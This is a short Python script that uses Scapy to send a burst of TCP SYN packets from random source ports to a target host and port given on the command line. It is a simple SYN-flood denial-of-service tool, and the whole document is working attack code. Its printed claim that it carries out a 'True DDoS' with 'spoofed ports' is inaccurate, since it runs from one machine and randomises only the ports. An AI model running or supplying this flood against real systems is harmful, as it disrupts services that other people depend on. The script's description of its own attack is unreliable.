import argparse
import random
import sys

def main():
    ap = argparse.ArgumentParser(description="Send a burst of TCP SYN packets from random ports.")
    ap.add_argument("count", type=int, help="number of SYNs to send")
    ap.add_argument("--dst",  default="127.0.0.1", help="target IP")
    ap.add_argument("--port", type=int, default=9, help="target port (closed)")
    a = ap.parse_args()
    
    try:
        # Import Scapy here so the script doesn't crash on startup if it's missing
        from scapy.all import IP, TCP, send
    except ImportError:
        sys.exit("Error: Scapy is not installed. Run 'pip install scapy'")

    print(f"Sending {a.count} SYNs to {a.dst}:{a.port} from random spoofed ports (True DDoS)...")
    
    for _ in range(a.count):
        pkt = IP(dst=a.dst) / TCP(
            sport=random.randint(1024, 65535), # Random source port
            dport=a.port,
            flags="S",
        )
        send(pkt, verbose=False)
        
    print("Done sending.")

if __name__ == "__main__":
    main()